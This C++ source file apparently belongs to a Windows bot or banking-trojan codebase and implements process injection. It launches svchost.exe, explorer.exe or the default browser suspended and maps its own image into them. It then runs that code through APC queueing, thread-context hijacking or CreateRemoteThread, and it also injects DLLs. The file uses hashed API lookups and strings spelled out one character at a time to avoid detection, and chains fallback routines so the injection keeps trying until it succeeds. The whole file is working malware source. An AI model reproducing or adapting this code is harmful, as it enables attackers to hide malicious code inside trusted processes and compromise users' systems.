#include <windows.h>
#include <shlobj.h>
#include <tlhelp32.h>

#include "GetApi.h"
#include "DllLoader.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"
#include "BotUtils.h"
#include "ntdll.h"

#define MakePtr( cast, ptr, addValue ) (cast)( (DWORD_PTR)(ptr) + (DWORD_PTR)(addValue)) 
#define MakeDelta(cast, x, y) (cast) ( (DWORD_PTR)(x) - (DWORD_PTR)(y)) 

DWORD dwNewBase = 0;

DWORD GetImageBase2()
{
	DWORD dwRet = 0;
  /*	__asm
	{
			call getbase
		getbase:
			pop eax
			and eax, 0ffff0000h
		find:
			cmp word ptr [ eax ], 0x5a4d
			je end
			sub eax, 00010000h
			jmp find
		end:
			mov [dwRet], eax
	} */

	return dwRet;
}


void PerformRebase( LPVOID lpAddress, DWORD dwNewBase )
{
	PIMAGE_DOS_HEADER pDH = (PIMAGE_DOS_HEADER)lpAddress;

	if ( pDH->e_magic != IMAGE_DOS_SIGNATURE )
	{
		return;
	}

	PIMAGE_NT_HEADERS pPE = (PIMAGE_NT_HEADERS) ((char *)pDH + pDH->e_lfanew);

	if ( pPE->Signature != IMAGE_NT_SIGNATURE )
	{
		return;
	}

	DWORD dwDelta = dwNewBase - pPE->OptionalHeader.ImageBase;

	DWORD dwVa = pPE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
	DWORD dwCb = pPE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

	PIMAGE_BASE_RELOCATION pBR = MakePtr( PIMAGE_BASE_RELOCATION, lpAddress, dwVa );

	UINT c = 0;

	while ( c < dwCb )
	{
		c += pBR->SizeOfBlock;

		int RelocCount = (pBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

		LPVOID lpvBase = MakePtr(LPVOID, lpAddress, pBR->VirtualAddress);

		WORD *areloc = MakePtr(LPWORD, pBR, sizeof(IMAGE_BASE_RELOCATION));

		for ( int i = 0; i < RelocCount; i++ )
		{
			int type = areloc[i] >> 12;

			if ( !type )
			{
				continue;
			}

			if ( type != 3 )
			{
				return;
			}

			int ofs = areloc[i] & 0x0fff;

			DWORD *pReloc = MakePtr( DWORD *, lpvBase, ofs );

			if ( *pReloc - pPE->OptionalHeader.ImageBase > pPE->OptionalHeader.SizeOfImage )
			{
				return;
			}

			*pReloc += dwDelta;
		}

		pBR = MakePtr( PIMAGE_BASE_RELOCATION, pBR, pBR->SizeOfBlock );
	}

	pPE->OptionalHeader.ImageBase = dwNewBase;

	return;
}

typedef struct 
{
	WORD	Offset:12;
	WORD	Type:4;
} IMAGE_FIXUP_ENTRY, *PIMAGE_FIXUP_ENTRY;

void ProcessRelocs( PIMAGE_BASE_RELOCATION Relocs, DWORD ImageBase, DWORD Delta, DWORD RelocSize )
{
	PIMAGE_BASE_RELOCATION Reloc = Relocs;

	while ( (DWORD)Reloc - (DWORD)Relocs < RelocSize ) 
	{
		if ( !Reloc->SizeOfBlock )
		{
			break;
		}

		PIMAGE_FIXUP_ENTRY Fixup = (PIMAGE_FIXUP_ENTRY)((ULONG)Reloc + sizeof(IMAGE_BASE_RELOCATION));

		for ( ULONG r = 0; r < (Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) >> 1; r++ ) 
		{
			DWORD dwPointerRva = Reloc->VirtualAddress + Fixup->Offset;

			if ( Fixup->Type == IMAGE_REL_BASED_HIGHLOW )
			{
				*(PULONG)((ULONG)ImageBase + dwPointerRva) += Delta;
			}

			Fixup++;
		}

		Reloc = (PIMAGE_BASE_RELOCATION)( (ULONG)Reloc + Reloc->SizeOfBlock );
	}

	return;
}



DWORD InjectCode( HANDLE hProcess, LPTHREAD_START_ROUTINE lpStartProc )
{
	HMODULE hModule = (HMODULE)GetImageBase();  

	PIMAGE_DOS_HEADER pDH = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pPE = (PIMAGE_NT_HEADERS) ((LPSTR)pDH + pDH->e_lfanew);

	DWORD dwSize = pPE->OptionalHeader.SizeOfImage;

	LPVOID lpNewAddr = MemAlloc( dwSize );

	if ( lpNewAddr == NULL )
	{
		return -1;
	}

	m_memcpy( lpNewAddr, hModule, dwSize );

	LPVOID lpNewModule = NULL;

	DWORD dwAddr = -1;
	HMODULE hNewModule = NULL;

	if ( (NTSTATUS)pZwAllocateVirtualMemory( hProcess, &lpNewModule, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) == STATUS_SUCCESS )
	{
		hNewModule = (HMODULE)lpNewModule;	

		ULONG RelRVA   = pPE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
		ULONG RelSize  = pPE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

		ProcessRelocs( (PIMAGE_BASE_RELOCATION)( (DWORD)hModule + RelRVA ), (DWORD)lpNewAddr, (DWORD)hNewModule - (DWORD)hModule, RelSize );		

		dwNewBase = (DWORD)hNewModule;

		if ( (NTSTATUS)pZwWriteVirtualMemory( hProcess,   hNewModule, lpNewAddr, dwSize, NULL ) == STATUS_SUCCESS )
		{
			dwAddr = (DWORD)lpStartProc - (DWORD)hModule + (DWORD)hNewModule;
		}
	}

	DWORD dwOldProtect = 0;
	pZwProtectVirtualMemory( hProcess, (PVOID*)&hNewModule, &dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect );
	
	MemFree( lpNewAddr );
	
	return dwAddr;
}


bool InjectCode2( HANDLE hProcess, HANDLE hThread, DWORD (WINAPI f_Main)(LPVOID) )
{
	DWORD dwBase = GetImageBase(&f_Main);
	DWORD dwSize = ((PIMAGE_OPTIONAL_HEADER)((LPVOID)((BYTE *)(dwBase) + ((PIMAGE_DOS_HEADER)(dwBase))->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER))))->SizeOfImage;

	HANDLE hMap = pCreateFileMappingA( (HANDLE)-1, NULL, PAGE_EXECUTE_READWRITE, 0, dwSize, NULL );

    LPVOID lpView = pMapViewOfFile( hMap, FILE_MAP_WRITE, 0, 0, 0 );

	if ( lpView == NULL )
	{
		return false;
	}

	m_memcpy( lpView, (LPVOID)dwBase, dwSize );

	DWORD dwViewSize    = 0;
	DWORD dwNewBaseAddr = 0;
	bool Result = false;

	NTSTATUS Status = (NTSTATUS)pZwMapViewOfSection( hMap, hProcess, (PVOID*)&dwNewBaseAddr, 0, dwSize, NULL, &dwViewSize, (SECTION_INHERIT)1, 0, PAGE_EXECUTE_READWRITE );

	if ( Status == STATUS_SUCCESS )
	{
		PIMAGE_DOS_HEADER dHeader   = (PIMAGE_DOS_HEADER)dwBase;
		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)RVATOVA(dwBase, dHeader->e_lfanew);

		ULONG RelRVA   = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
		ULONG RelSize  = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

		ProcessRelocs( (PIMAGE_BASE_RELOCATION)( dwBase + RelRVA ), (DWORD)lpView, dwNewBaseAddr - dwBase, RelSize );		

		DWORD dwAddr = (DWORD)f_Main - dwBase + dwNewBaseAddr;

		Status = (NTSTATUS)pZwQueueApcThread( hThread, (PKNORMAL_ROUTINE)dwAddr, NULL, NULL, NULL );
		if (Status == STATUS_SUCCESS)
		{
			Status = (NTSTATUS)pZwResumeThread( (DWORD)hThread, NULL );
			Result = (Status == STATUS_SUCCESS);
		}
		else
		{
			pTerminateThread( hThread, 0 );
		}
	}

	pUnmapViewOfFile( lpView );
    pCloseHandle( hMap );

	return Result;
}

bool InjectCode3( HANDLE hProcess, HANDLE hThread, DWORD (WINAPI f_Main)(LPVOID) )
{
	DWORD dwAddr = InjectCode( hProcess, f_Main );

	if ( dwAddr != -1 )
	{
		CONTEXT Context;

		m_memset( &Context, 0, sizeof( CONTEXT ) );

		Context.ContextFlags = CONTEXT_INTEGER;
		Context.Eax			 = dwAddr;

		DWORD dwBytes = 0;

        pWriteProcessMemory( hProcess,(LPVOID)( Context.Ebx + 8 ), &dwNewBase, 4, &dwBytes );
        pZwSetContextThread( hThread, &Context );
        pZwResumeThread( (DWORD)hThread, NULL );
	}

	return true;
}

//
bool InjectCode4( HANDLE hProcess, DWORD (WINAPI f_Main)(LPVOID) )
{
	DWORD dwBase = GetImageBase(&f_Main);
	DWORD dwSize = ((PIMAGE_OPTIONAL_HEADER)((LPVOID)((BYTE *)(dwBase) + ((PIMAGE_DOS_HEADER)(dwBase))->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER))))->SizeOfImage;

	HANDLE hMap = pCreateFileMappingA( (HANDLE)-1, NULL, PAGE_EXECUTE_READWRITE, 0, dwSize, NULL );

    LPVOID lpView = pMapViewOfFile( hMap, FILE_MAP_WRITE, 0, 0, 0 );

	if ( lpView == NULL )
	{
		return false;
	}

	m_memcpy( lpView, (LPVOID)dwBase, dwSize );

	DWORD dwViewSize    = 0;
	DWORD dwNewBaseAddr = 0;

	NTSTATUS Status = (NTSTATUS)pZwMapViewOfSection( hMap, hProcess, (PVOID*)&dwNewBaseAddr, 0, dwSize, NULL, &dwViewSize, (SECTION_INHERIT)1, 0, PAGE_EXECUTE_READWRITE );

	if ( Status == STATUS_SUCCESS )
	{		
		PIMAGE_DOS_HEADER dHeader   = (PIMAGE_DOS_HEADER)dwBase;
		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)RVATOVA(dwBase, dHeader->e_lfanew);

		ULONG RelRVA   = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
		ULONG RelSize  = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

		ProcessRelocs( (PIMAGE_BASE_RELOCATION)( dwBase + RelRVA ), (DWORD)lpView, dwNewBaseAddr - dwBase, RelSize );		

		DWORD dwAddr = (DWORD)f_Main - dwBase + dwNewBaseAddr;

		//pZwResumeThread( hThread, NULL );
		DWORD id;

		if ( ! pCreateRemoteThread(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)dwAddr,NULL,0,&id) )
		{
			//pTerminateThread( hThread, 0 );
		}

	}

	pUnmapViewOfFile( lpView );
    pCloseHandle( hMap );

	return true;
}

bool CreateSvchost( PHANDLE hProcess, PHANDLE hThread )
{
	WCHAR Svchost[] = {'s','v','c','h','o','s','t','.','e','x','e',0};
	WCHAR Args[]	= {'-','k',' ','n','e','t','s','v','c','s',0};

	WCHAR *SysPath = (WCHAR*)MemAlloc( 512 );

	if ( !SysPath )
	{
		return false;
	}

	pGetSystemDirectoryW( SysPath, 512 );

	plstrcatW( SysPath, L"\\" );
	plstrcatW( SysPath, Svchost );

	PROCESS_INFORMATION pi;
	STARTUPINFOW si;

	m_memset( &si, 0, sizeof( STARTUPINFOW ) );		
	si.cb	= sizeof( STARTUPINFOW );

	bool ret = false;
	
	if( (BOOL)pCreateProcessW( SysPath, Args, 0, 0, TRUE, CREATE_SUSPENDED, 0, 0, &si, &pi ) )
	{
		*hProcess = pi.hProcess;
		*hThread  = pi.hThread;

		ret = true;
	}

	MemFree( SysPath );
	return ret;
}

bool CreateExplorer( PHANDLE hProcess, PHANDLE hThread )
{
	WCHAR Explorer[] = {'e','x','p','l','o','r','e','r','.','e','x','e',0};

	WCHAR *SysPath = (WCHAR*)MemAlloc( 512 );

	if ( SysPath == NULL )
	{
		return false;
	}

	pGetWindowsDirectoryW( SysPath, 512 );

	plstrcatW( SysPath, L"\\" );
	plstrcatW( SysPath, Explorer );


	HANDLE hTmpProcess = NULL;
	HANDLE hTmpThread  = NULL;

	bool ret = RunFileEx( SysPath, CREATE_SUSPENDED, &hTmpProcess, &hTmpThread );

	if ( ret )
	{
		*hProcess = hTmpProcess;
		*hThread  = hTmpThread;
	}


	return ret;
}


//-------------------------------------------------------
//  Функция возвращает путь к браузеру по умолчанию
//-------------------------------------------------------
wstring GetDefaultBrowserPath()
{
	// Создаём HTML файл
	wstring HTMLFile = GetSpecialFolderPathW(CSIDL_APPDATA, L"index.html");
	File::WriteBufferW(HTMLFile.t_str(), NULL, 0);

	// Получаем имя файла
	wstring FileName(MAX_PATH);
	if (pFindExecutableW(HTMLFile.t_str(), NULL, FileName.t_str()))
		FileName.CalcLength();
	else
		FileName.Clear();

	// Удаляем временный файл
	pDeleteFileW(HTMLFile.t_str());

	return FileName;
}


/*
WCHAR *GetDefaultBrowserPath()
{
	WCHAR Html[] = {'\\','i','n','d','e','x','.','h','t','m','l',0};

	WCHAR *Path = GetShellFoldersKey( 2 );

	plstrcatW( Path, Html );

	HANDLE hFile = pCreateFileW( Path, 0, 0, 0, CREATE_ALWAYS, 0, 0);

	if ( hFile == INVALID_HANDLE_VALUE )
	{
		return NULL;
	}

	pCloseHandle( hFile );

	WCHAR *BrowserPath = (WCHAR*)MemAlloc( MAX_PATH );

	if ( BrowserPath == NULL )
	{
		return NULL;
	}

	pFindExecutableW( Path, L"", BrowserPath );

	pDeleteFileW( Path );

	MemFree( Path );

	return BrowserPath;
}

*/

bool CreateDefaultBrowser( PHANDLE hProcess, PHANDLE hThread )
{
	PROCESS_INFORMATION pi;
	STARTUPINFOW si;

	m_memset( &si, 0, sizeof( STARTUPINFOW ) );		
	si.cb	= sizeof( STARTUPINFOW );

	wstring BrowserPath = GetDefaultBrowserPath();

	if (BrowserPath.IsEmpty())
		return false;

	if(pCreateProcessW(BrowserPath.t_str(), NULL, 0, 0, TRUE, CREATE_SUSPENDED, 0, 0, &si, &pi ) )
	{
		*hProcess = pi.hProcess;
		*hThread  = pi.hThread;

		return true;
	}

	return false;
}

bool JmpToBrowserSelf( DWORD (WINAPI f_Main)(LPVOID) )
{
	HANDLE hProcess = NULL;
	HANDLE hThread	= NULL;

	if ( CreateDefaultBrowser( &hProcess, &hThread ) )
	{
		if ( InjectCode2( hProcess, hThread, f_Main ) )
		{
			return true;
		}
		else
		{
			pTerminateThread( hThread, 0 );
		}
	}

	return false;
}


bool JmpToSvchostSelf( DWORD (WINAPI f_Main)(LPVOID) )
{
	HANDLE hProcess = NULL;
	HANDLE hThread	= NULL;

	if ( CreateSvchost( &hProcess, &hThread ) )
	{
		if ( InjectCode2( hProcess, hThread, f_Main ) )
			return true;
		else
			pTerminateThread( hThread, 0 );
	}

	return false;
}


bool TwiceJumpSelf( DWORD (WINAPI f_Main)(LPVOID) )
{
	if ( !JmpToSvchostSelf( f_Main ) )
	{
		if ( !JmpToBrowserSelf( f_Main ) )
		{
			return false;
		}
	}

	return true;
}

bool JmpToBrowser( DWORD (WINAPI f_Main)(LPVOID) )
{
	HANDLE hProcess = NULL;
	HANDLE hThread	= NULL;

	if ( CreateDefaultBrowser( &hProcess, &hThread ) )
	{
		if ( InjectCode3( hProcess, hThread, f_Main ) )
		{
			return true;
		}
		else
		{
			pTerminateThread( hThread, 0 );
		}
	}

	return false;
}

bool JmpToSvchost( DWORD (WINAPI f_Main)(LPVOID) )
{
	HANDLE hProcess = NULL;
	HANDLE hThread	= NULL;

	bool bRet = false;

	if ( CreateSvchost( &hProcess, &hThread ) )
	{
		if ( InjectCode3( hProcess, hThread, f_Main ) )
		{
			return true;
		}
		else
		{
			pTerminateThread( hThread, 0 );
		}
	}

	return false;
}


bool TwiceJump( DWORD (WINAPI f_Main)(LPVOID) )
{
	if ( !JmpToSvchost( f_Main ) )
	{
		if ( !JmpToBrowser( f_Main ) )
		{
			return false;
		}
	}

	return true;
}

BOOL WINAPI MegaJump( DWORD (WINAPI f_Main)(LPVOID) )
{
	if ( !TwiceJumpSelf( f_Main ) )
	{
		if ( !TwiceJump( f_Main ) )
		{
			return FALSE;
		}
	}

	return TRUE;
}

bool JmpToExplorer( DWORD (WINAPI f_Main)(LPVOID) )
{
	HANDLE hProcess = NULL;
	HANDLE hThread	= NULL;

	bool bRet = false;

	if ( CreateExplorer( &hProcess, &hThread ) )
	{
		if ( InjectCode2(hProcess, hThread, f_Main ) )
		{
			return true;
		}
		else
		{
			pTerminateThread( hThread, 0 );
		}
	}

	return false;
}

bool InjectIntoProcess( DWORD pid, DWORD (WINAPI *func)(LPVOID) )
{
	OBJECT_ATTRIBUTES ObjectAttributes = { sizeof(ObjectAttributes) } ;
	CLIENT_ID ClientID;

	ClientID.UniqueProcess = (HANDLE)pid;
	ClientID.UniqueThread  = 0;

	HANDLE hProcess;
		
	if ( pZwOpenProcess( &hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, &ObjectAttributes, &ClientID ) != STATUS_SUCCESS )
	{
		return false;
	}

	DWORD dwAddr = InjectCode( hProcess, func );

	bool ret = false;

	if ( dwAddr != -1 )
	{
		LPVOID Thread = pCreateRemoteThread( hProcess, 0, 0, (LPTHREAD_START_ROUTINE)dwAddr, NULL, 0, 0 );
		ret = Thread != NULL;
	}

	pZwClose(hProcess); 
	
	return ret;
}

bool InjectIntoProcess2( DWORD pid, DWORD (WINAPI *func)(LPVOID) )
{
	OBJECT_ATTRIBUTES ObjectAttributes = { sizeof(ObjectAttributes) } ;
	CLIENT_ID ClientID;

	ClientID.UniqueProcess = (HANDLE)pid;
	ClientID.UniqueThread  = 0;

	HANDLE hProcess;
		
	if ( pZwOpenProcess( &hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, &ObjectAttributes, &ClientID ) != STATUS_SUCCESS )
	{
		return false;
	}
	return InjectCode4( hProcess, func ); 
}

bool InjectIntoExplorer( DWORD (WINAPI f_Main)(LPVOID) )
{
	DWORD Pid = GetExplorerPid();

	if (!Pid) return false;

	return InjectIntoProcess(Pid, f_Main );
}


bool InjectDll( WCHAR *DllPath )
{
	if ( pGetFileAttributesW( DllPath ) )
	{
		HANDLE hProcess;
		HANDLE hThread;

		if ( !CreateSvchost( &hProcess, &hThread ) )
		{
			if ( !CreateDefaultBrowser( &hProcess, &hThread ) )
			{
				return false;
			}
		}
		
		DWORD dwWritten;

		LPVOID lpStringLoc = pVirtualAllocEx( hProcess, 0, m_wcslen( DllPath ) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
		
		if ( !(BOOL)pWriteProcessMemory( hProcess, lpStringLoc, DllPath, m_wcslen( DllPath ) + 1, &dwWritten ) )
		{
			return false;
		}

		pCreateRemoteThread( hProcess, 0, 0, (LPTHREAD_START_ROUTINE)GetProcAddressEx( NULL, 1, 0xC8AC8030 ), lpStringLoc, 0, 0 );
	}
		
	
	return true;
}
